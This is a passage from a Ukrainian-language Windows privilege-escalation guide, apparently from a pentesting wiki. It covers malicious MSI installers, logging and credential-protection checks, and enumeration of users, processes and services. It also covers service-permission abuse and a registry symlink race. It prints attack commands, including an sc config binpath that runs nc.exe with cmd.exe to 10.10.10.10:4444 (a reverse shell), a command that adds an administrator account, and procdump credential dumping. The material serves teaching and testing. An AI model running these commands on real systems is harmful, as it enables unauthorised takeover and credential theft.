- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть його**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що вибрали платформу x64.

### Установлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб використати цю вразливість, можна скористатися: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Параметри аудиту

Ці параметри визначають, що **журналюється**, тому зверніть на них увагу

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локальних облікових записів Administrator**, забезпечуючи, щоб на комп’ютерах, приєднаних до домену, кожен пароль був **унікальним, випадковим і регулярно оновлювався**. Ці паролі безпечно зберігаються в Active Directory, і доступ до них мають лише користувачі, яким надано достатні дозволи через ACL, що дає їм змогу переглядати паролі локальних адміністраторів за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо функцію активовано, **паролі зберігаються в LSASS у відкритому вигляді** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист локального органу безпеки (LSA), щоб **блокувати** спроби ненадійних процесів **читати його пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Докладніше про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладніша інформація про Credential Guard доступна тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Облікові дані домену** проходять автентифікацію через **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача проходять автентифікацію за допомогою зареєстрованого пакета безпеки, для користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають цікаві дозволи групи, до яких ви належите.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до певної привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся про привілейовані групи та про те, як зловживати ними для підвищення привілеїв, тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляції з токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте цю сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, що увійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час перегляду списку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл**, або чи маєте ви права на запис у папку з бінарним файлом, щоб скористатися можливими [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), оскільки їх можна використати для підвищення привілеїв.

Слухач debugger може працювати недовго, тому його відсутність в одному знімку стану портів не доводить, що він ніколи не був доступний. Якщо ви виявили слухач, зіставте його з PID, власником процесу та можливістю користувача з нижчими привілеями до нього підключитися; сама назва програми або прапорець debug не доводять можливість виконання коду від імені іншого користувача. Під час звичайного збору даних використовуйте пасивні методи, не надсилаючи команди debugger.

**Перевірка дозволів на бінарні файли процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів на папки з бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати спільні бібліотеки з каталогу `dynamicpreprocessor directory`, зазначеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL оголошеного каталогу модулів. Якщо ваш токен дає змогу створювати там файли, цей шлях варто перевірити як можливий шлях до виконання коду під час наступного завантаження модулів завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів і будь-які обмеження заборони чи спільного доступу; сам факт доступності каталогу для запису не доводить можливість підвищення привілеїв. У [документації Snort щодо динамічних препроцесорів](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з доступним для запису кореневим каталогом документів

В інсталяції Apache для Windows порівняйте шлях до виконуваного файла служби та обліковий запис запуску зі значенням `DocumentRoot` в активному файлі `httpd.conf`. Для стандартного компонування XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, яким часто є `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, виконання коду на стороні сервера може перетнути межу привілеїв хоста. Переконайтеся, що служба запущена, що обслуговується саме цей шлях і що обробник на стороні сервера обробляє відповідний тип файлів; сам факт доступності кореневого каталогу для запису доводить лише можливість створення файлів. Перевірте ACL, не записуючи тестовий файл:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартного встановлення WAMP служба може вказувати на версійний файл `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація міститися поруч із ним у `conf\httpd.conf`, а кореневим каталогом за замовчуванням бути `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний образ служби, обліковий запис, від імені якого вона працює, ефективний `DocumentRoot` (включно з розгортанням `${INSTALL_DIR}` і перевизначеннями віртуальних хостів), а також ACL кореневого каталогу. Доступ для запису до каталогу WAMP не доводить, що Apache працює як `SYSTEM` або виконує надісланий файл. [Apache документує, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований пул і обробник на сервері. Код у каталозі, з якого віддаються файли, виконується від імені пулу лише тоді, коли IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати каталог із доступом для запису засобом виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час виконання, обробник і перевизначення для конкретного шляху.

Динамічна компіляція ASP.NET створює окремий шлях для перевірки: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідному встановленні .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft документує розташування та підкаталоги для окремих застосунків](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчим рівнем привілеїв дає змогу змінити згенерований код у кеші **конкретного** застосунку, з’ясуйте, чи компілює застосунок його повторно під більш привілейованою [ідентичністю робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі по собі ACL файлу чи каталогу не доводять можливості виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом повторної компіляції. Переглядайте метадані лише для читання; не запускайте компіляцію й не змінюйте файли кешу під час перерахування.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до ресурсів домену як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низький рівень привілеїв. `LocalSystem` уже має високі привілеї локально та також використовує обліковий запис комп’ютера в мережі; `LocalService` зазвичай використовує анонімні облікові дані для мережевих підключень. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft документує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть успадковуватися стандартні налаштування пулу, які відрізняються між поколіннями IIS, тому визначте ефективну конфігурацію замість того, щоб робити припущення за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, оцініть права **саме цього комп’ютера** в домені. Для [DCSync](../active-directory-methodology/dcsync.md) потрібні права реплікації в контексті іменування домену; сам по собі квиток облікового запису комп’ютера чи його роль хоста цього не доводить. Пасивне перерахування має перевіряти конфігурацію та ACL, не завантажуючи файли, не виконуючи мережеву автентифікацію й не запитуючи квитки.

Якщо доступний для читання обробник ASP.NET запускає допоміжний процес, простежте шлях будь-якого значення, що надходить із запиту, через автентифікацію, розшифрування, перевірку та формування команди. Обробник, який додає декодований токен до `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft документує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що недовірений викликач справді може впливати на декодоване значення та викликати обробник, а потім визначте ефективну ідентичність пулу застосунків або імперсонованого користувача й ідентичність дочірнього процесу. Рядок вихідного коду, доступний для читання, слухач на localhost чи слабкість формату токена самі по собі не доводять можливості виконання привілейованої команди. Переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного перерахування.

Для служби PHP у Windows шлях, контрольований запитом і переданий до [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачеві з нижчим рівнем привілеїв, від імені робочого процесу. Переконайтеся, що запит може дійти до цього оператора, визначений шлях указує на файл, який користувач із нижчим рівнем привілеїв може змінити, а робочий процес — прочитати, що застосовні обмеження PHP на шляхи дозволяють включення і що робочий процес справді має вищі привілеї. Слухач на loopback-інтерфейсі чи файл, доступний для запису, самі по собі не доводять наявність цього ланцюжка; перевіряйте вихідний код, ідентичність служби та ACL файлів, не викликаючи кінцеву точку під час пасивного перерахування.

### Видобування паролів із пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. Служби на кшталт FTP мають **облікові дані у відкритому вигляді в пам’яті** — спробуйте створити дамп пам’яті й прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Небезпечні GUI-програми

**Програми, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Windows Help and Support» (Windows + F1): знайдіть «command prompt» і натисніть «Click to open Command Prompt».

### Імпорт файлів проєктів із підвищеними привілеями

Програма, яка автоматично відкриває проєкти з каталогу для скидання файлів, доступного для запису користувачам із нижчим рівнем привілеїв, перетинає межу довіри до вхідних даних від імені облікового запису імпортера. Перевірте **точний шлях із правом запису**, процес або завдання, що відкриває його, його ефективну ідентичність і версію парсера. [Історична проблема Ghidra з відкриттям/відновленням проєктів](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяла [політика вихідних SMB-підключень і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це можливий шлях до розкриття облікових даних, а не безпосереднього доступу адміністратора: отриману відповідь має бути можливо використати через окремий авторизований або вразливий шлях, а поточні збірки потрібно оцінювати з урахуванням фактичного стану виправлень. Не відкривайте створений ізловмисно проєкт під час пасивної інвентаризації; перевірте робочий процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об’єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит лише на читання [`OpenSCManager` для цього права](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) — це підстава для подальшої перевірки, а не доказ того, що нову службу можна запустити. [`CreateService повертає дескриптор`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо можна було використати початковий дескриптор. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску та шлях до виконуваного файлу. Не створюйте й не запускайте службу під час пасивної інвентаризації.

Для віддаленого шляху встановлення служби зіставте ці права SCM зі спільним ресурсом на цільовій системі, до якого **той самий мережевий сеанс входу** має право запису, його базовим ACL NTFS і локальним шляхом до виконуваного файлу, який може запускати обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо одночасно існують незвично широкі права SCM і шлях розміщення файлу; адміністративний спільний ресурс не є обов’язковою умовою. Самого права запису до спільного ресурсу або окремого факту наявності права SCM на створення служби недостатньо, щоб довести, що нова служба може запуститися з вищими привілеями.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла визначається в каталозі, доступному для запису користувачам із нижчим рівнем привілеїв, а служба працює з вищими привілеями, відсутній файл може бути умовним кандидатом на заміну. Підтвердьте **фактичний код служби або документований виклик допоміжного файла**, визначений шлях до виконуваного файла та порядок пошуку, права на створення каталогу, ідентичність служби й наявність відповідного тригера життєвого циклу. Каталог служби з правом запису або відсутній файл самі по собі не доводять, що служба завантажить цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дає змогу передавати аргументи до `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або задокументований інтерфейс. Якщо служба використовує вибраний викликачем аргумент як шлях до журналу або експорту, перевірте ідентичність служби, точний потік даних від аргументу до операції запису, обмеження шляхів і права доступу до **створеного файла**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самого права запису до журналу або права запуску недостатньо. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ файл `nsclient.ini`, доступний для читання, є **підставою для перевірки конфігурації**: він може містити облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, вебслухач і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для виконання з підвищеними привілеями додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), ефективне право реєструвати або змінювати команду та тригер, який запускає її від імені облікового запису служби. Слухач, доступний лише через loopback, усе одно може бути доступний локальному користувачу, але самі шлях до файла, пароль або слухач не підтверджують наявність потрібних прав. Під час пасивної інвентаризації перевіряйте метадані й дозволи, не показуючи секретів і не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебінтерфейсу та скриптів](https://nsclient.org/docs/setup/securing/) і [налаштування зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби та її значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає там дочірню програму](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, доступна через цей дочірній процес, є окремою підставою для перевірки: підтвердьте, що користувач із нижчим рівнем привілеїв може підключитися до слухача, що саме потрібна операція приймає його вхідні дані, а дочірній процес служби виконує небезпечну операцію з вищими привілеями. Сам обліковий запис служби, URL кінцевої точки або шлях із правом запису не доводять можливість підвищення привілеїв; під час пасивної інвентаризації не викликайте операції служби.

Для власної операції WCF простежте, чи потрапляє контрольований викликачем рядок у будь-який runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає конвеєр](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними транспортного рівня Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але право викликати **саме цю** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від вхідних даних виклику з нижчим рівнем привілеїв до `AddScript`, що виконується від імені служби з вищими привілеями, є межею виконання коду; сам порт, автентифікований клієнт або невикористовуваний метод у сторонній збірці нічого не доводять. Статично перевірте розгорнуту службу, контракт, авторизацію та налаштування імперсонації, не викликаючи кінцеву точку під час інвентаризації.

Service Triggers дають змогу Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, активуючи їхні тригери. Див. методи інвентаризації та активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

До інсталяцій Visual Studio з інструментами C/C++ може входити `VSStandardCollectorService150` — діагностична служба, налаштована для запуску від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) для перенаправлення скидання DACL служби використовували junction і гонку з object-manager link. Для демонстрації підвищення привілеїв також потрібен був робочий шлях відновлення MSI через Visual Studio Setup WMI Provider і файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` як ціль. Цей компонент виправили в січні 2024 року.

Для пасивної первинної перевірки перегляньте обліковий запис і шлях до двійкового файла саме цієї служби, перевірте, чи існує шлях до компілятора Setup WMI, і встановіть стан виправлень компонента. Запис служби, версія продукту Visual Studio або сам файл компілятора не доводять, що система вразлива. Для перевірки не потрібно запускати службу або виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ви можете завантажити accesschk.exe для XP тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо виникає така помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу не вдалося запустити: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Зверніть увагу, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Ще один спосіб обійти цю проблему** — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

Якщо група «Authenticated users» має **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити завдяки різним дозволам:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати бінарний файл служби.
- **WRITE_DAC**: Дозволяє переналаштувати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та переналаштувати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися модулем _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого облікового запису домену, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна перехопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінювати бінарний файл, який запускає служба**, або чи маєте **дозволи на запис до папки**, де розташовано цей бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати список усіх бінарних файлів, які запускаються службами, за допомогою **wmic** (не в system32), а потім перевірити свої дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** чи **`(W)`** для виконуваного файла служби або каталогу, у якому він міститься. Практична схема експлуатації:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Перевірте, чи можна записувати до бінарного файла, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи спрацювання тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачу перезапускати її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію на випадок збою, яка повторно запускає її, або чи можна опосередковано запустити її через програму, що її використовує.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінювати будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби за допомогою:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Оригінальну перевірку дозволів сформулювали так:

Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який запускає служба, можна змінити.

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис у реєстрі для певного ключа служби. Сам запис ACL не доводить наявності ефективного доступу: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` на об’єкт служби. Для ескалації також потрібні придатне поле конфігурації служби, спосіб запустити службу та обліковий запис служби з вищими привілеями. Див. документацію Microsoft про [права на ключ реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [права доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до бінарного файлу, який запускається:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка символічного посилання в реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для окремих користувачів, які згодом копіюються процесом **SYSTEM** до ключа сеансу HKLM. **Гонка символічного посилання** в реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив для довільного запису **значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходу до захищеного робочого стола та доступний для запису користувачу.

Схема зловживання (CVE-2026-24291 / ATConfig):

1. Заповніть потрібне значення **HKCU ATConfig**, яке має бути записане від імені SYSTEM.
2. Запустіть копіювання до захищеного робочого стола (наприклад, за допомогою **LockWorkstation**), що запускає потік AT broker.
3. **Виграйте гонку**, установивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищений цільовий ключ HKLM.
4. SYSTEM записує вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість довільно записувати значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** реалізація публічного експлойту **блокує робочу станцію** в межах гонки.

Приклад інструментарію (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
